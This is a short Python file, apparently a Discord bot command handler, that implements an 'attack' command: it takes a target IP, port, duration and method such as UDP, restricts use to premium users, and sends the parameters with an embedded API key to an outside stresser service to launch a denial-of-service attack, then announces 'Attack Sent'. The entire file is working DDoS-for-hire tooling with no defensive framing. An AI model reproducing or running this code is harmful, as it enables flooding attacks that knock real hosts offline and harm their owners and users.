import os, sys, time, requests

from ...utils.custom_utils import *
from ...discord_utils.embed_msg import *

from ...authentication.main import *

async def attack(client, fmsg, cmd, args):
    if len(args) < 4: return (await client.channel.send("[x] Error, Invalid argument\nUsage {}attack <ip> <port> <time> <method>\nExample: {}attack 1.1.1.1 80 300 UDP".format(Config.bot_prefix, Config.bot_prefix)))
    print(client.author.id)
    if Auth.isPremium(client.author.id) == 0:
        return await embed(client, "Error", "[x] You are not a premium user to use this tool!")

    # if ipv4_check(args[1]) == 0:
    #     return (await embed(client, "Error", "[x] The IPv4 HOST you've provided is not a valid IPv4!"))
    api_response = requests.get("https://toxicstress.live/api.go/key=3543645876123&host=" + args[1] + "&port=" + args[2] + "&time=" + args[3] + "&method=" + args[4]).text
    print(api_response)
    await embed(client, "Attack Sent", f"Attack Successfully sent to " + args[1] + ":" + args[2] + " for " + args[3] + " seconds with " + args[4] + "!")